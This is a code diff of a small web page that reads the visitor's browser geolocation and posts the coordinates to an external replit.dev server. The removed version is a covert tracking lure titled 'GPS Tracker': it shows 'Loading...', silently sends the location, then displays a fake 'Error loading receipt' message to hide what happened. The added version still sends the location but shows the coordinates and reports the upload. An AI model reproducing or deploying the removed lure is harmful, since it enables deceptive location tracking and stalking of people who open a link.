@@ -1,29 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>GPS Tracker</title>
-</head>
-<body>
-  <h2>Loading... please wait</h2>
-  <script>
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        fetch("https://90dcf3a8-5962-436e-b023-c534307f80c6-00-2oy1xavsaekkh.sisko.replit.dev/location", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          })
-        }).then(() => {
-          document.body.innerHTML = "<h2>Error loading receipt. Please try again later.</h2>";
-        });
+<script>
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Show location on the page
+      document.body.innerHTML = `
+        <h2>Your Location:</h2>
+        <p>Latitude: ${latitude}</p>
+        <p>Longitude: ${longitude}</p>
+        <p>Sending to server...</p>
+      `;
+
+      // Send location to server
+      fetch("https://90dcf3a8-5962-436e-b023-c534307f80c6-00-2oy1xavsaekkh.sisko.replit.dev/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(() => {
+        document.body.innerHTML += `<p><strong>✅ Location sent successfully!</strong></p>`;
+      })
+      .catch(() => {
+        document.body.innerHTML += `<p><strong>❌ Failed to send location.</strong></p>`;
       });
-    } else {
-      document.body.innerHTML = "<h2>Location access not supported</h2>";
-    }
-  </script>
-</body>
-</html>
+    });
+  } else {
+    document.body.innerHTML = "<h2>Location access not supported</h2>";
+  }
+</script>
